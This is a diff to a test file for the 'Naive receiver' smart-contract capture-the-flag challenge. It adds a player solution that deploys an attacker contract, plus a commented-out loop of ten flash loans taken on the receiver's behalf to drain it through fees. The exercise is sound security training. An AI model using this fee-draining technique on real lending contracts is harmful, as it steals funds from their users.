@@ -38,6 +38,16 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // const ETH = await pool.ETH();
+        const AttackerContractFactory = await ethers.getContractFactory('Attack_Naive_Receiver', player);
+        await AttackerContractFactory.deploy(pool.address,receiver.address);
+
+        // Solution 1
+        // for(let z=0; z<10;z++){
+        // await pool.connect(player).flashLoan(receiver.address,ETH,10n**18n, "0x");
+       
+        // }
+       
     });
 
     after(async function () {
